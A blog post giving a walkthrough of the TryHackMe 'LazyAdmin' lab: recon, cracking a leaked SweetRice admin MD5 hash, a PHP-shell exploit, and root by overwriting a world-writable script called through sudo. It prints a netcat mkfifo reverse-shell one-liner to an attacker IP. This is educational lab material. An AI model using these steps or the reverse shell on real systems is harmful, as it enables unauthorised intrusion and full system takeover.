<!DOCTYPE html>
<html class="dark" lang=" en"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>TryHackMe - LazyAdmin | Akymos.io</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="TryHackMe - LazyAdmin" />
<meta name="author" content="Akymos" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Easy linux machine to practice your skills" />
<meta property="og:description" content="Easy linux machine to practice your skills" />
<link rel="canonical" href="https://akymos.io/ctf/2023/04/23/lazyadmin.html" />
<meta property="og:url" content="https://akymos.io/ctf/2023/04/23/lazyadmin.html" />
<meta property="og:site_name" content="Akymos.io" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-04-23T17:24:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="TryHackMe - LazyAdmin" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Akymos"},"dateModified":"2023-04-23T17:24:00+00:00","datePublished":"2023-04-23T17:24:00+00:00","description":"Easy linux machine to practice your skills","headline":"TryHackMe - LazyAdmin","mainEntityOfPage":{"@type":"WebPage","@id":"https://akymos.io/ctf/2023/04/23/lazyadmin.html"},"url":"https://akymos.io/ctf/2023/04/23/lazyadmin.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/main.css"><link type="application/atom+xml" rel="alternate" href="https://akymos.io/feed.xml" title="Akymos.io" /><!-- Magnific Popup core CSS file -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js" integrity="sha512-jGR1T3dQerLCSm/IGEGbndPwzszJBlKQ5Br9vuB0Pw2iyxOy+7AK+lJcCC8eaXyz/9du+bkCy4HXxByhxkHf+w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js" integrity="sha512-IsNh5E3eYy3tr/JiX2Yx4vsCujtkhwl7SLqgnwLNgf04Hrt9BT9SXlLlZlWx+OK4ndzAoALhsMNcCmkggjZB1w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.6.5/flowbite.min.js" integrity="sha512-CUU7D5YgLISaFU6CpCXmXG6dZDD7RoYBocHwukyd7SYkFy0p7gP3zXGSLOtJ1bELJnK6aYBg4t7hnl0d8Dk2YA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head><body class="flex flex-col min-h-screen"><header>
    <nav>
        <div class="max-w-screen-xl flex flex-wrap items-center justify-between mx-auto p-4">
            <div>
                <h1 class="font-bold leading-tight mt-3 text-3xl text-slate-100 lg:mb-6 lg:text-3xl">
                    <a href="/index.html">Akymos.io</a>
                </h1>
            </div>  
            <button data-collapse-toggle="navbar-default" type="button" class="inline-flex items-center p-2 ml-3 text-sm rounded-lg md:hidden focus:outline-none" aria-controls="navbar-default" aria-expanded="false">
                <span class="sr-only">Open menu</span>
                <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
            </button>
            <div class="hidden w-full md:block md:w-auto" id="navbar-default">
                <ul class="font-medium flex flex-col p-4 md:p-0 mt-4 border rounded-lg  md:flex-row md:space-x-8 md:mt-0 md:border-0">
                    <li>
                        <a href="/ctf/index.html" class="block font-bold md:mt-3 lg:mb-6 lg:text-xl">CTF</a>
                    </li>
                    <li>
                        <a href="/project/index.html" class="block font-bold md:mt-3 lg:mb-6 lg:text-xl">PROJECTS</a>
                    </li>
                    <li>
                        <a href="/about.html" class="block font-bold md:mt-3 lg:mb-6 lg:text-xl">ABOUT</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
</header><main class="pb-4">
        <div class="flex justify-between px-4 mx-auto max-w-screen-xl ">
            <article class="mx-auto w-full format format-sm sm:format-base lg:format-lg format-invert prose prose-invert lg:prose-xl">
                <header class="mb-4 lg:mb-6 not-format">
    <address class="flex items-center mb-6 not-italic">
        <div class="inline-flex items-center mr-3 text-sm text-white">
            <a href="/about.html">
                <img class="mr-4 w-16 h-16 rounded-full" src="https://github.com/akymos.png" alt="Akymos">
            </a>
            <div>
                <p class="text-base font-light text-gray-400">
                    <time pubdate="2023-04-23 17:24:00 +0000" datetime="2023-04-23 17:24:00 +0000" title="23 Apr 2023">Published on 2 weeks ago</time> by <a href="/about.html" class="text-base font-light text-gray-400">Akymos</a>
                </p>
                <p class="text-base font-light text-gray-400">
                    1 min read
                </p>
                <p class="text-base font-light text-gray-400">
                    
                    <a class="tag ctf" href="/tag/ctf/index.html">ctf</a>
                    
                    <a class="tag tryhackme" href="/tag/tryhackme/index.html">tryhackme</a>
                    
                </p>
            </div>
        </div>
    </address>
    <h1>TryHackMe - LazyAdmin</h1>
</header>

<hr />
<h2>
  
  
    Table of Contents
  
  
</h2>
    
<nav class="toc">
<ul id="markdown-toc">
  <li><a href="#room-info" id="markdown-toc-room-info">Room info</a>    <ul>
      <li><a href="#questions" id="markdown-toc-questions">Questions</a></li>
    </ul>
  </li>
  <li><a href="#step-0---recon" id="markdown-toc-step-0---recon">Step 0 - Recon</a>    <ul>
      <li><a href="#nmap" id="markdown-toc-nmap">Nmap</a></li>
      <li><a href="#gobuster" id="markdown-toc-gobuster">Gobuster</a></li>
      <li><a href="#gobuster-on-content" id="markdown-toc-gobuster-on-content">Gobuster on /content</a></li>
      <li><a href="#john-the-ripper" id="markdown-toc-john-the-ripper">John the Ripper</a></li>
      <li><a href="#exploit" id="markdown-toc-exploit">Exploit</a></li>
    </ul>
  </li>
  <li><a href="#question-1---what-is-the-user-flag" id="markdown-toc-question-1---what-is-the-user-flag">Question 1 - What is the user flag?</a></li>
  <li><a href="#question-2---what-is-the-root-flag" id="markdown-toc-question-2---what-is-the-root-flag">Question 2 - What is the root flag?</a>    <ul>
      <li><a href="#privilege-escalation" id="markdown-toc-privilege-escalation">Privilege escalation</a></li>
      <li><a href="#roottxt" id="markdown-toc-roottxt">Root.txt</a></li>
    </ul>
  </li>
</ul>

</nav><hr />

<div class="pb-1"></div>
<h2 id="room-info">
  
  
    <a href="#room-info">#</a> Room info
  
  
</h2>
    
<ul>
  <li><strong>Name</strong>: LazyAdmin</li>
  <li><strong>Link</strong>: <a href="https://tryhackme.com/room/lazyadmin" target="_blank">https://tryhackme.com/room/lazyadmin</a></li>
  <li><strong>Subscription</strong>: Free</li>
  <li><strong>Difficulty</strong>: Easy</li>
  <li><strong>Description</strong>: Easy linux machine to practice your skills</li>
</ul>
<h3 id="questions">
  
  
    <a href="#questions">#</a> Questions
  
  
</h3>
    
<ol>
  <li>What is the user flag?</li>
  <li>What is the root flag?</li>
</ol>
<h2 id="step-0---recon">
  
  
    <a href="#step-0---recon">#</a> Step 0 - Recon
  
  
</h2>
    
<h3 id="nmap">
  
  
    <a href="#nmap">#</a> Nmap
  
  
</h3>
    
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.26.136
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-24 21:28 CEST
Nmap scan report <span class="k">for </span>10.10.26.136
Host is up <span class="o">(</span>0.082s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 <span class="o">(</span>RSA<span class="o">)</span>
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 61846227c6c32917dd27459e29cb905e <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>28.88 seconds
</code></pre></div></div>
<p>Nice, port 80 is open, but nothing interesting on it, only the default Apache page.
<img src="/assets/images/ctf-lazyadmin/01.png" alt="LazyAdmin - Apache default page" class="post-image" /></p>
<h3 id="gobuster">
  
  
    <a href="#gobuster">#</a> Gobuster
  
  
</h3>
    
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> 10.10.26.136 <span class="nt">-q</span>
/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/content              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/]
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 11321]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
</code></pre></div></div>
<p>We have a ‘strange’ directory: <code class="language-plaintext highlighter-rouge">/content</code>. Let’s check it out.
<img src="/assets/images/ctf-lazyadmin/02.png" alt="LazyAdmin - /content directory" class="post-image" /></p>
<h3 id="gobuster-on-content">
  
  
    <a href="#gobuster-on-content">#</a> Gobuster on /content
  
  
</h3>
    
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-u</span> 10.10.26.136/content <span class="nt">-q</span>
/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/_themes              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 322] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/_themes/]
/as                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/as/]
/attachment           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 325] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/attachment/]
/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 321] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/images/]
/inc                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/inc/]
/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2198]
/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 317] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.26.136/content/js/]
</code></pre></div></div>
<p>Directory index is enabled. <code class="language-plaintext highlighter-rouge">/as</code> contains the admin panel of the website, but we don’t have any credentials (YET).
The directory <code class="language-plaintext highlighter-rouge">/inc</code> contains another folder: <code class="language-plaintext highlighter-rouge">/inc/mysql_backup</code>. Inside it, we have a file called <code class="language-plaintext highlighter-rouge">mysql_bakup_20191129023059-1.5.1.sql</code>. Let’s download it and check it out.</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="k">return</span> <span class="k">array</span> <span class="p">(</span>
  <span class="mi">0</span> <span class="o">=&gt;</span> <span class="s1">'DROP TABLE IF EXISTS `%--%_attachment`;'</span><span class="p">,</span>
<span class="mf">......</span>
  <span class="mi">14</span> <span class="o">=&gt;</span> <span class="s1">'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&amp;#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"&lt;p&gt;Welcome to SweetRice - Thank your for install SweetRice as your website management system.&lt;/p&gt;&lt;h1&gt;This site is building now , please come late.&lt;/h1&gt;&lt;p&gt;If you are the webmaster,please go to Dashboard -&gt; General -&gt; Website setting &lt;/p&gt;&lt;p&gt;and uncheck the checkbox \\"Site close\\" to open your website.&lt;/p&gt;&lt;p&gt;More help at &lt;a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\"&gt;Tip for Basic CMS SweetRice installed&lt;/a&gt;&lt;/p&gt;\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');'</span><span class="p">,</span>
<span class="mf">......</span>
<span class="p">)</span> <span class="no">ENGINE</span><span class="o">=</span><span class="nc">MyISAM</span> <span class="k">DEFAULT</span> <span class="no">CHARSET</span><span class="o">=</span><span class="n">utf8</span><span class="p">;</span><span class="err">'</span><span class="p">,</span>
<span class="p">);</span><span class="cp">?&gt;</span>
</code></pre></div></div>
<p>We have found the credentials for the admin panel: <code class="language-plaintext highlighter-rouge">manager:42f749ade7f9e195bf475f37a44cafcb</code> (MD5 hash).</p>
<h3 id="john-the-ripper">
  
  
    <a href="#john-the-ripper">#</a> John the Ripper
  
  
</h3>
    
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo </span>42f749ade7f9e195bf475f37a44cafcb <span class="o">&gt;</span> hash.txt <span class="o">&amp;&amp;</span> john <span class="nt">--format</span><span class="o">=</span>RAW-MD5 <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>2
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="k">***********</span>      <span class="o">(</span>?<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2023-04-24 21:59<span class="o">)</span> 100.0g/s 3379Kp/s 3379Kc/s 3379KC/s coco21..redlips
Use the <span class="s2">"--show --format=Raw-MD5"</span> options to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>
<p>So the admin account is:</p>
<ul>
  <li>Username: <code class="language-plaintext highlighter-rouge">manager</code></li>
  <li>Password: <code class="language-plaintext highlighter-rouge">***********</code>
<img src="/assets/images/ctf-lazyadmin/03.png" alt="LazyAdmin - Admin panel" class="post-image" /></li>
</ul>
<h3 id="exploit">
  
  
    <a href="#exploit">#</a> Exploit
  
  
</h3>
    
<p>In this version of SweetRice, there is a vulnerability that allows us to use a PHP shell. We can use it to get a reverse shell.
<a href="https://www.exploit-db.com/exploits/40700" target="_blank">https://www.exploit-db.com/exploits/40700</a></p>
<h2 id="question-1---what-is-the-user-flag">
  
  
    <a href="#question-1---what-is-the-user-flag">#</a> Question 1 - What is the user flag?
  
  
</h2>
    
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9001
listening on <span class="o">[</span>any] 9001 ...
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
<span class="nv">$ </span><span class="nb">cat</span> /home/itguy/user.txt
THM<span class="o">{</span><span class="k">***************************</span><span class="o">}</span>
</code></pre></div></div>
<p>The user flag is: <code class="language-plaintext highlighter-rouge">THM{***************************}</code></p>
<h2 id="question-2---what-is-the-root-flag">
  
  
    <a href="#question-2---what-is-the-root-flag">#</a> Question 2 - What is the root flag?
  
  
</h2>
    
<h3 id="privilege-escalation">
  
  
    <a href="#privilege-escalation">#</a> Privilege escalation
  
  
</h3>
    
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span> 
Matching Defaults entries <span class="k">for </span>www-data on THM-Chal:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User www-data may run the following commands on THM-Chal:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
<span class="nv">$ </span><span class="nb">cat</span> /home/itguy/backup.pl
<span class="c">#!/usr/bin/perl</span>

system<span class="o">(</span><span class="s2">"sh"</span>, <span class="s2">"/etc/copy.sh"</span><span class="o">)</span><span class="p">;</span>

<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lha</span> /etc/copy.sh
<span class="nt">-rw-r--rwx</span> 1 root root 81 Nov 29  2019 /etc/copy.sh
<span class="nv">$ </span><span class="nb">cat</span> /etc/copy.sh
<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 192.168.0.190 5554 <span class="o">&gt;</span>/tmp/f

<span class="nv">$ </span><span class="c"># We can modify the file /etc/copy.sh</span>
<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.32.129 9002 &gt;/tmp/f"</span> <span class="o">&gt;</span> /etc/copy.sh
<span class="nv">$ </span><span class="nb">cat</span> /etc/copy.sh
<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.8.32.129 9002 <span class="o">&gt;</span>/tmp/f

<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/perl /home/itguy/backup.pl
</code></pre></div></div>
<h3 id="roottxt">
  
  
    <a href="#roottxt">#</a> Root.txt
  
  
</h3>
    
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 9002
listening on <span class="o">[</span>any] 9002 ...
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c"># cd /root</span>
<span class="c"># ls</span>
root.txt
<span class="c"># cat root.txt</span>
THM<span class="o">{</span><span class="k">***************************</span><span class="o">}</span>
</code></pre></div></div>
<p>The root flag is: <code class="language-plaintext highlighter-rouge">THM{***************************}</code></p>



            </article>
        </div>
    </main>
    
    <script>
        window.FontAwesomeConfig = {
            searchPseudoElements: true
        }
        $(document).ready(function () {
            $('.post-image').magnificPopup({
                type: 'image',
                callbacks: {
                    elementParse: function (item) {
                        item.src = item.el.attr('src');
                    }
                }
            });
        });
    </script>
</body>

</html>